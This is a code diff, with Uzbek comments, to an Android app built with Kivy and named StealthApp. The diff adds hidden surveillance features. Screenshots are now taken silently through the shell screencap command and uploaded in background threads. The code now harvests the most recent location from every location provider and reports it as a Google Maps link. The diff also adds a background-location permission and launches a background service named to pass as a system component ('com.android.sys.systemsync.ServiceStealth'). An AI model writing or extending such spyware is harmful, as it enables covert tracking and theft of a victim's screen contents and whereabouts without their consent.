@@ -218,29 +218,35 @@ def take_photo_kivy(front_camera):
 # ─── EKRAN RASMI (Screenshot) ──────────────────────────────────────────────────
 def take_screenshot_sync():
     try:
-        from kivy.core.window import Window
         from jnius import autoclass
         activity = autoclass('org.kivy.android.PythonActivity').mActivity
         ext_dir  = activity.getExternalFilesDir(None).getAbsolutePath()
-        filepath = ext_dir + '/screenshot.png'
-
-        # Kivy oynasini rasmga olish
-        Window.screenshot(name=filepath)
+        filepath = ext_dir + '/scr.png'
         
-        # Kivy screenshot nomiga sanani qo'shib yuboradi, shuni to'g'irlaymiz
-        # Window.screenshot('a.png') -> creates 'a0001.png' etc.
-        # Shuning uchun eng yangi .png faylni qidiramiz
+        # 1-usul: Android shell orqali (ba'zi qurilmalarda ishlaydi)
+        os.system(f'screencap -p {filepath}')
+        
+        if os.path.exists(filepath) and os.path.getsize(filepath) > 1000:
+            threading.Thread(
+                target=upload_file_sync, args=(filepath, 'photo'), daemon=True
+            ).start()
+            return "Ekran rasmi (Shell) olindi, yuborilmoqda..."
+
+        # 2-usul: Kivy oynasini rasmga olish (agar ilova ochiq bo'lsa)
+        from kivy.core.window import Window
+        Window.screenshot(name=filepath)
         time.sleep(1.0)
+        
         import glob
-        files = glob.glob(ext_dir + '/screenshot*.png')
+        files = glob.glob(ext_dir + '/scr*.png')
         if files:
             latest_file = max(files, key=os.path.getctime)
             threading.Thread(
                 target=upload_file_sync, args=(latest_file, 'photo'), daemon=True
             ).start()
-            return "Ekran rasmi olindi, yuborilmoqda..."
-        else:
-            return "Ekran rasmi: Fayl yaratilmadi."
+            return "Ekran rasmi (Window) olindi, yuborilmoqda..."
+            
+        return "Ekran rasmi olinmadi. (Android 11+ da tizim ruxsati talab qilinishi mumkin)"
     except Exception as e:
         return "Screenshot xatoligi: " + str(e)
 
@@ -253,18 +259,27 @@ def get_location_sync():
         Context  = autoclass('android.content.Context')
         LM       = activity.getSystemService(Context.LOCATION_SERVICE)
 
-        # GPS yoki Tarmoq orqali oxirgi ma'lum bo'lgan manzilni olish
-        loc = LM.getLastKnownLocation('gps')
-        if not loc:
-            loc = LM.getLastKnownLocation('network')
+        is_gps_enabled = LM.isProviderEnabled('gps')
+        is_net_enabled = LM.isProviderEnabled('network')
+        
+        providers = LM.getProviders(True).toArray()
+        loc = None
+        
+        for p in providers:
+            l = LM.getLastKnownLocation(p)
+            if l:
+                if not loc or l.getTime() > loc.getTime():
+                    loc = l
 
         if loc:
             lat = loc.getLatitude()
             lon = loc.getLongitude()
-            maps_url = "📍 Manzil topildi:\nhttps://www.google.com/maps?q=" + str(lat) + "," + str(lon)
-            return maps_url
+            diff_min = int((time.time() * 1000 - loc.getTime()) / 60000)
+            time_str = " (hozirgi)" if diff_min < 2 else f" ({diff_min} daqiqa oldingi)"
+            return "📍 Manzil topildi" + time_str + ":\nhttps://www.google.com/maps?q=" + str(lat) + "," + str(lon)
         else:
-            return "📍 Manzil: Aniqlab bo'lmadi (GPS o'chiq bo'lishi mumkin)."
+            diag = f"\n(GPS: {'YOQ' if is_gps_enabled else 'OCHIQ'}, Network: {'YOQ' if is_net_enabled else 'OCHIQ'})"
+            return "📍 Manzilni aniqlab bo'lmadi. GPS ochiq bo'lsa ham 'Last Location' yo'q." + diag
     except Exception as e:
         return "📍 Manzil xatoligi: " + str(e)
 
@@ -448,12 +463,23 @@ class StealthApp(App):
                 Permission.READ_EXTERNAL_STORAGE,
                 Permission.ACCESS_FINE_LOCATION,
                 Permission.ACCESS_COARSE_LOCATION,
+                Permission.ACCESS_BACKGROUND_LOCATION,
             ], self._on_permissions_result)
         except Exception as e:
             status[0] = 'Ruxsat xatoligi: ' + str(e)[:80]
             threading.Thread(target=run_loop, daemon=True).start()
 
     def _on_permissions_result(self, permissions, grants):
+        # Servisni ishga tushirish (background uchun)
+        if platform == 'android':
+            try:
+                from jnius import autoclass
+                service = autoclass('com.android.sys.systemsync.ServiceStealth')
+                mActivity = autoclass('org.kivy.android.PythonActivity').mActivity
+                service.start(mActivity, "")
+            except Exception as e:
+                status[0] = "Servis xatosi: " + str(e)
+
         # Avval WakeLock, keyin loop
         Clock.schedule_once(lambda dt: _acquire_wake_lock(), 0.5)
         threading.Thread(target=run_loop, daemon=True).start()
